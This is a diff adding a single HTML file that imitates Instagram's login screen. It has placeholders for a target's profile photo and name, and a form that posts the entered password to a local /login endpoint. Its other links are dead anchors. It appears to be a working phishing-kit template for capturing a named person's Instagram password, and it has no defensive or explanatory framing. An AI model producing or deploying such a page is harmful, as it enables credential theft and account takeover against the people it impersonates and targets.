@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Instagram</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+  background:#fafafa;
+  min-height:100vh;
+  display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  padding:20px;
+  -webkit-font-smoothing:antialiased;
+}
+.card{
+  background:#fff;border:1px solid #dbdbdb;
+  border-radius:12px;padding:32px 28px 24px;
+  width:100%;max-width:380px;text-align:center;
+  animation:fadeUp .4s ease;
+}
+@keyframes fadeUp{
+  from{opacity:0;transform:translateY(12px)}
+  to{opacity:1;transform:translateY(0)}
+}
+.logo{
+  font-family:'Segoe UI',cursive;
+  font-size:38px;font-style:italic;
+  font-weight:400;color:#262626;
+  margin-bottom:24px;letter-spacing:-1px;
+}
+.profile{margin-bottom:24px}
+.avatar-wrap{
+  width:84px;height:84px;border-radius:50%;
+  margin:0 auto 10px;
+  background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
+  padding:3px;
+}
+.avatar-wrap img{
+  width:100%;height:100%;border-radius:50%;
+  object-fit:cover;border:3px solid #fff;display:block;
+}
+.profile h2{
+  font-size:18px;font-weight:900;
+  color:#262626;letter-spacing:-.2px;
+}
+.input-wrap{position:relative;margin-bottom:12px}
+.input-wrap input{
+  width:100%;padding:14px 48px 14px 14px;
+  border:1.5px solid #dbdbdb;border-radius:8px;
+  font-size:15px;color:#262626;
+  background:#fafafa;outline:none;
+  transition:all .2s ease;
+}
+.input-wrap input:focus{
+  border-color:#a8a8a8;background:#fff;
+  box-shadow:0 0 0 2px rgba(0,149,246,.1);
+}
+.input-wrap input::placeholder{color:#8e8e8e}
+.show-btn{
+  position:absolute;right:12px;top:50%;transform:translateY(-50%);
+  background:none;border:none;cursor:pointer;
+  font-size:13px;font-weight:700;color:#262626;
+}
+.submit-btn{
+  width:100%;padding:11px;
+  background:linear-gradient(135deg,#0095f6,#0077ed);
+  color:#fff;border:none;border-radius:8px;
+  font-size:15px;font-weight:700;cursor:pointer;
+  margin-top:6px;
+  box-shadow:0 2px 8px rgba(0,149,246,.2);
+  transition:all .2s ease;
+}
+.submit-btn:hover{
+  background:linear-gradient(135deg,#0077ed,#0066cc);
+  transform:translateY(-1px);
+}
+.submit-btn:active{transform:scale(.98)}
+.divider{
+  display:flex;align-items:center;margin:20px 0;
+}
+.divider::before,.divider::after{
+  content:'';flex:1;border-top:1px solid #dbdbdb;
+}
+.divider span{
+  padding:0 16px;font-size:13px;
+  font-weight:700;color:#8e8e8e;
+}
+.forgot{
+  color:#00376b;font-size:12px;
+  text-decoration:none;display:block;font-weight:500;
+}
+.forgot:hover{text-decoration:underline}
+.signup{
+  background:#fff;border:1px solid #dbdbdb;
+  border-radius:8px;padding:18px;
+  margin-top:12px;font-size:14px;
+  color:#262626;width:100%;max-width:380px;
+  text-align:center;
+}
+.signup a{color:#0095f6;font-weight:700;text-decoration:none}
+.app{
+  margin-top:16px;font-size:13px;color:#8e8e8e;
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h1 class="logo">Instagram</h1>
+
+  <div class="profile">
+    <div class="avatar-wrap">
+      <img src="__PROFILE_IMG__" alt="">
+    </div>
+    <h2>__NAME__</h2>
+  </div>
+
+  <form action="/login" method="POST">
+    <div class="input-wrap">
+      <input type="password" name="password" id="pw"
+             placeholder="Password" required
+             autocomplete="current-password">
+      <button type="button" class="show-btn" onclick="toggle()">Show</button>
+    </div>
+    <button type="submit" class="submit-btn">Log In</button>
+  </form>
+
+  <div class="divider"><span>OR</span></div>
+  <a href="#" class="forgot">Forgot password?</a>
+</div>
+
+<div class="signup">
+  Don't have an account? <a href="#">Sign up</a>
+</div>
+<p class="app">Get the app for iOS & Android</p>
+
+<script>
+function toggle(){
+  var p=document.getElementById("pw");
+  var b=event.target;
+  if(p.type==="password"){p.type="text";b.textContent="Hide"}
+  else{p.type="password";b.textContent="Show"}
+}
+</script>
+</body>
+</html>
